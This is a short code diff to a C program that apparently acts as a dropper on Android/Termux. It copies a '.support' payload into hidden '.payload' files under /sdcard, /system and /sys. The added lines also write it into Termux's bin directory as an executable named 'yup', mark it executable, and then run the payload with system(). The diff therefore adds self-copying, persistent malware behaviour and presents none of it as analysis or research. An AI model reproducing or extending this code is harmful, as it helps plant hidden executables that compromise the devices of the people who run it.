@@ -11,13 +11,19 @@ int main(){
       FILE *copy = fopen("/sdcard/.payload", "w");
       FILE *cp = fopen("/system/.payload", "w");
       FILE *cp2 = fopen("/sys/.payload", "w");
+      FILE *an = fopen("/data/data/com.termux/files/usr/bin/yup", "w");
       FILE *pload = fopen(".support", "r");
       int ch=0;
-      while(ch != EOF){
+      system("chmod +x /data/data/com.termux/files/usr/bin/yup;");
+      while(1){
         ch = fgetc(pload);
         fputc(ch, copy);
         fputc(ch, cp);
         fputc(ch, cp2);
+        fputc(ch, an);
+        if(ch == EOF){
+          break;
+        }
       }
       system("exec .support;");
     }
